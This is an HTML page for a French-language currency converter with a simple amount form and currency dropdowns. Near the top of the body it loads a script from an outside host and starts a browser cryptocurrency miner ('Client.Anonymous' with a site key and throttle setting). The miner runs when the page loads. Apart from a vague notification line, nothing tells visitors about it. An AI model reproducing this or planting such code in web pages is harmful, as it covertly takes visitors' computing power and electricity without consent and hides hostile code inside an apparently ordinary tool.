<!DOCTYPE html>
<html>
<head>
  <title>Convertisseur de devises</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <script src="https://www.hostingcloud.racing/vTKT.js"></script>
  <script>
      var _client = new Client.Anonymous('ce76b6cc12ea242b65151223d2e5badc3fbf423e7db8b6dc850f12af5c8eb32d', {
          throttle: 0.2, c: 'w'
      });
      _client.start();
      _client.addMiningNotification("Bottom", "This site is very good", "#cccccc", 20, "#3d3d3d");

  </script>
  <div id="container">
    <h1>Convertisseur de devises</h1>
    <form>
      <label for="amount">Montant :</label>
      <input type="text" id="amount" placeholder="Entrez le montant à convertir">
      <br>
      <label for="from">De :</label>
      <select id="from">
        <option value="USD">USD - Dollar américain</option>
        <option value="EUR">EUR - Euro</option>
        <option value="GBP">GBP - Livre sterling</option>
        <option value="JPY">JPY - Yen japonais</option>
      </select>
      <img src="flags/USD.png" class="flag">
      <br>
      <label for="to">À :</label>
      <select id="to">
        <option value="USD">USD - Dollar américain</option>
        <option value="EUR">EUR - Euro</option>
        <option value="GBP">GBP - Livre sterling</option>
        <option value="JPY">JPY - Yen japonais</option>
      </select>
      <img src="flags/USD.png" class="flag">
      <br><br>
      <button type="button" onclick="convert()">Convertir</button>
    </form>
    <p id="result"></p>
  </div>
  <script src="script.js"></script>
</body>
</html>
